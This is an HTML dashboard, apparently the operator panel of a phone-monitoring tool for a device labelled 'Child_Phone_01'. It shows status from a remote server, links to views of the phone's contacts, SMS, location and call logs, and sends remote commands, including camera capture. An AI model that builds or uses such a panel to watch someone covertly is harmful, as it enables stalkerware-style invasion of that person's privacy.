<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Control Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #0f0f0f; --glass-bg: rgba(255, 255, 255, 0.1);
            --text-main: #ffffff; --accent: #4caf50; --offline: #ff4444;
        }
        body {
            background-color: var(--bg-color); color: var(--text-main);
            font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px;
            display: flex; justify-content: center;
        }
        .container {
            width: 100%; max-width: 450px; background: rgba(0, 0, 0, 0.5);
            border-radius: 30px; padding: 20px; border: 1px solid #333;
        }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .device-name { font-size: 1.1rem; font-weight: bold; color: var(--accent); }
        .status-badge { background: #222; padding: 5px 12px; border-radius: 20px; font-size: 0.75rem; display: flex; align-items: center; gap: 8px; }
        .dot { height: 10px; width: 10px; border-radius: 50%; background: #555; }
        .dot.online { background: var(--accent); box-shadow: 0 0 10px var(--accent); }
        .dot.offline { background: var(--offline); }

        .controls-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-top: 20px; }
        .control-btn {
            background: var(--glass-bg); border-radius: 18px; aspect-ratio: 1/1;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            border: 1px solid #444; cursor: pointer; text-decoration: none; color: white;
        }
        .control-btn:hover { border-color: var(--accent); background: rgba(255,255,255,0.15); }
        .control-btn i { font-size: 1.2rem; margin-bottom: 5px; }
        .control-btn span { font-size: 0.6rem; color: #ccc; }
        .btn-refresh {
            width: 100%; background: #1a1a1a; color: var(--accent); border: 1px solid var(--accent);
            padding: 12px; border-radius: 15px; margin-top: 20px; cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div>
                <i class="fa-solid fa-mobile-screen-button"></i>
                <span class="device-name" id="deviceName">M2103K19I</span>
            </div>
            <div class="status-badge">
                <span id="statusDot" class="dot"></span>
                <span id="statusText">Wait...</span>
            </div>
        </div>

        <div style="text-align:center; font-size:0.9rem; color:#aaa;">
            Battery: <span id="batteryPercent" style="color:white;">--%</span>
        </div>

        <div class="controls-grid">
            <a href="#" onclick="openPage('view_contacts.html')" class="control-btn"><i class="fa-solid fa-address-book"></i><span>Contacts</span></a>
            <a href="#" onclick="openPage('view_sms.html')" class="control-btn"><i class="fa-solid fa-comments"></i><span>SMS</span></a>
            <a href="#" onclick="openPage('view_location.html')" class="control-btn"><i class="fa-solid fa-location-dot"></i><span>Location</span></a>
            <a href="#" onclick="openPage('view_call_logs.html')" class="control-btn"><i class="fa-solid fa-phone"></i><span>Calls</span></a>
            
            <div class="control-btn" onclick="sendCommand('vibrate')"><i class="fa-solid fa-vibration"></i><span>Vibrate</span></div>
            <div class="control-btn" onclick="sendCommand('ring')"><i class="fa-solid fa-bell"></i><span>Ring</span></div>
            <div class="control-btn" onclick="sendCommand('silent')"><i class="fa-solid fa-bell-slash"></i><span>Silent</span></div>
            <div class="control-btn" onclick="sendCommand('cam_back')"><i class="fa-solid fa-camera"></i><span>Cam</span></div>
        </div>

        <button class="btn-refresh" onclick="updateDashboard()">
            <i class="fa-solid fa-rotate-right" id="refreshIcon"></i> Refresh Status
        </button>
    </div>

    <script>
        // âœ… CORRECT SETTINGS
        const RENDER_URL = "https://child-v9no.onrender.com";
      // Pehle M2103K19I likha tha, ab wapas ye kar do:
const DEVICE_ID = "Child_Phone_01"; // <-- CORRECT ID

        async function updateDashboard() {
            const icon = document.getElementById('refreshIcon');
            icon.classList.add('fa-spin');

            try {
                const response = await fetch(`${RENDER_URL}/api/device-status/${DEVICE_ID}`);
                const data = await response.json();

                const dot = document.getElementById('statusDot');
                const statusText = document.getElementById('statusText');

                if (data.isOnline) {
                    dot.className = "dot online";
                    statusText.innerText = "Online";
                } else {
                    dot.className = "dot offline";
                    statusText.innerText = "Offline";
                }
                document.getElementById('batteryPercent').innerText = (data.battery || 0) + "%";

            } catch (err) {
                console.log("Error:", err);
            } finally {
                setTimeout(() => icon.classList.remove('fa-spin'), 1000);
            }
        }

        async function sendCommand(action) {
            try {
                await fetch(`${RENDER_URL}/api/send-command`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ device_id: DEVICE_ID, command: action })
                });
                alert("Command sent: " + action);
            } catch(e) { alert("Failed to send"); }
        }

        function openPage(page) {
            // ID ko save karo taaki agla page use kar sake
            localStorage.setItem("TARGET_DEVICE_ID", DEVICE_ID);
            window.location.href = page;
        }

        setInterval(updateDashboard, 5000);
        updateDashboard();
    </script>
</body>
</html>
